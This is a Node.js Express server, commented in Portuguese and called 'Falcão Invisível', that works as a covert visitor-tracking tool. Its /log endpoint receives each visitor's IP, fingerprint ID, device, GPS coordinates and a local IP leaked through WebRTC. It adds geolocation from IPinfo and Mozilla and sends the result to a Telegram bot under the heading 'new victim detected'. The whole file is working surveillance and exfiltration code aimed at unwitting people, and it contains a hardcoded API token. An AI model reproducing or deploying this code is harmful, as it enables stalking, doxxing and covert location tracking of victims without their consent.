const express = require('express');
const fetch = require('node-fetch');
const bodyParser = require('body-parser');
const app = express();
const PORT = process.env.PORT || 3000;

// Variáveis de ambiente (.env ou Render)
const botToken = process.env.BOT_TOKEN;
const chatId = process.env.CHAT_ID;

app.use(bodyParser.json());
app.use(express.static('public'));

app.get('/', (req, res) => {
  res.sendFile(__dirname + '/public/index.html');
});

app.post('/log', async (req, res) => {
  const data = req.body;
  console.log("📥 Dados recebidos do front:", data);

  if (!botToken || !chatId) {
    console.error("❌ BOT_TOKEN ou CHAT_ID não definidos!");
    return res.status(500).send("Bot não configurado.");
  }

  let preciseLoc = null;

  // Localização via Mozilla (fallback caso GPS falhe)
  try {
    const mlsRes = await fetch("https://location.services.mozilla.com/v1/geolocate?key=test", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ considerIp: true })
    });
    const mlsData = await mlsRes.json();
    if (mlsData && mlsData.location) {
      preciseLoc = `${mlsData.location.lat},${mlsData.location.lng}`;
    }
  } catch (mlsErr) {
    console.warn("⚠️ Mozilla Location Service falhou:", mlsErr);
  }

  // Dados via IPinfo
  try {
    const ipResponse = await fetch(`https://ipinfo.io/${data.ip}?token=c5633786f81824`);
    const ipInfo = await ipResponse.json();

    const mensagem = `
📡 *NOVA VÍTIMA DETECTADA*

🧠 *ID:* \`${data.visitorId || "N/A"}\`
🌍 *IP:* \`${data.ip}\`
📍 *Localização:* ${ipInfo.city || "N/A"}, ${ipInfo.region || "N/A"}, ${ipInfo.country || "N/A"}
🏢 *ISP:* ${ipInfo.org || "N/A"}
🕵️‍♂️ *User-Agent:* \`${data.userAgent || "N/A"}\`
📱 *Dispositivo:* \`${data.device || "N/A"}\`
📌 *Lat/Long:* ${data.loc || preciseLoc || ipInfo.loc || "Indisponível"}
🌐 *IP Local (WebRTC):* \`${data.localIP || "N/A"}\`
`;

    console.log("🔍 Enviando dados ao Telegram...");

    const telegramRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: mensagem,
        parse_mode: "Markdown"
      })
    });

    const telegramResult = await telegramRes.json();
    console.log("📤 RESPOSTA TELEGRAM:", telegramResult);

    if (!telegramResult.ok) {
      console.error("❌ Erro ao enviar para o Telegram:", telegramResult.description);
    } else {
      console.log("✅ Notificação enviada com sucesso!");
    }

    res.sendStatus(200);
  } catch (err) {
    console.error("❌ Erro no processo de rastreamento:", err);
    res.status(500).send("Erro interno no rastreamento.");
  }
});

app.listen(PORT, () => {
  console.log(`🦅 Falcão Invisível rodando em: http://localhost:${PORT}`);
});
